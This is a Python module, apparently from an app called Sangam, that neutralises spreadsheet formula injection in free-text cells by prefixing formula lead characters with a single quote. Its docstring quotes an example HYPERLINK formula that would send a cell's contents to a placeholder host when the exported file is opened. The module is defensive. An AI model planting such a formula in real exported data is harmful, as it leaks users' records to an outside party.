"""Making cell text safe to write back into a spreadsheet.

Excel, LibreOffice and Google Sheets all treat a cell beginning `=`, `+`, `-` or
`@` as a formula. A prospect list downloaded from the web, or sent by a lead
vendor, can therefore carry a cell like `=HYPERLINK("http://x/?"&A1,"click")`
which does nothing at all inside Sangam - the browser renders it as text - and
then exfiltrates a column the moment somebody exports the list and opens it.

The mitigation is the boring one: prefix the value with a single quote, which
spreadsheets consume as "treat the rest as text" and do not display. Applied when
the value *enters* the system rather than when it leaves, because there will
eventually be more than one way out - CSV export, an XLSX report, a webhook - and
a rule applied at every exit is a rule that will be forgotten at one of them.

Only leading characters matter, and only for free text. Emails and phone numbers
go through their own validators, which reject these characters outright.
"""

from __future__ import annotations

from typing import Final

#: Leading characters a spreadsheet interprets as the start of a formula.
FORMULA_PREFIXES: Final[tuple[str, ...]] = ("=", "+", "-", "@")

#: Control characters Excel also treats as a formula lead-in when they precede one.
_CONTROL_LEADS: Final[tuple[str, ...]] = ("\t", "\r", "\n")


def looks_like_formula(value: str) -> bool:
    """True when a spreadsheet would try to evaluate this cell."""
    stripped = value.lstrip("".join(_CONTROL_LEADS))
    return stripped.startswith(FORMULA_PREFIXES)


def neutralise_formula(value: str) -> str:
    """Return the text with any formula lead-in defused.

    A negative number is left alone: `-500` is data, not an attack, and quoting it
    would turn a number into text in every downstream sheet. Only a leading `-`
    followed by something non-numeric is treated as suspicious.
    """
    if not value:
        return value
    stripped = value.lstrip("".join(_CONTROL_LEADS))
    if not stripped.startswith(FORMULA_PREFIXES):
        return value
    if stripped[0] == "-" and stripped[1:2].isdigit():
        return value
    return "'" + value
